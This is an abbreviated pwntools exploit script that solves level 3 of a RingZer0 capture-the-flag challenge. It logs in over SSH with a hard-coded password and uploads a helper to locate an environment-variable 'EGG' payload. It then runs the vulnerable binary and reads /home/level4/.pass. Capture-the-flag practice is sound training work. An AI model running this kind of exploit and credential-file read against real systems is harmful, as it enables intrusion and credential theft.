...
r = ssh(user='level3', host='challenges.ringzer0ctf.com', port=10080, password='b130hOOfGftXUfmRZlgD', raw=True)

rgetenvaddr = '/tmp/aif32983h'
r.upload('./getenvaddr', rgetenvaddr)
r.system(f"perl -e 'chmod 0755, \"{rgetenvaddr}\"'")
...
eggfinder = r.process([rgetenvaddr, 'EGG'], env=env)
...
io = r.process(['/levels/level3', argv1, argv2], env=env)
...
io.sendline(b'cat /home/level4/.pass')
print('flag')
print(io.readline())
